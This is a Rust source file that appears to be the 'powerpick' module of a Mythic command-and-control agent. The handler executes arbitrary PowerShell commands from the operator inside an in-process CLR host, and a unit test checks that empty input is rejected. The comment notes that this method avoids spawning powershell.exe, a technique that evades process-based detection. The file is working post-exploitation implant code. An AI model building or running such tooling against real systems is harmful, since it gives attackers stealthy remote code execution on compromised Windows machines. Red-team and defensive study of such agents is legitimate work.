//! Execute PowerShell through rustclr's in-process CLR host.
//!
//! Windows only. This avoids spawning `powershell.exe`; it relies on
//! `System.Management.Automation` being available to the .NET runtime.

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;

#[derive(Deserialize)]
struct Params {
    command: String,
}

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("powerpick parse error: {e}")),
    };

    if params.command.trim().is_empty() {
        return TaskResponse::failed(task.id, "powerpick requires a command");
    }

    #[cfg(not(windows))]
    {
        let _ = params;
        TaskResponse::failed(task.id, "powerpick is only supported on Windows")
    }

    #[cfg(windows)]
    {
        let pwsh = match rustclr::PowerShell::new() {
            Ok(p) => p,
            Err(e) => {
                return TaskResponse::failed(task.id, &format!("PowerShell init failed: {e}"));
            }
        };
        match pwsh.execute(&params.command) {
            Ok(output) => TaskResponse {
                task_id: task.id,
                completed: Some(true),
                status: Some("completed".into()),
                user_output: Some(output),
                ..Default::default()
            },
            Err(e) => TaskResponse::failed(task.id, &format!("powerpick failed: {e}")),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_powerpick_requires_command() {
        let task = TaskMessage {
            command: "powerpick".into(),
            parameters: r#"{"command":""}"#.into(),
            ..Default::default()
        };
        let resp = handle(&task);
        assert_eq!(resp.status.as_deref(), Some("error"));
    }
}
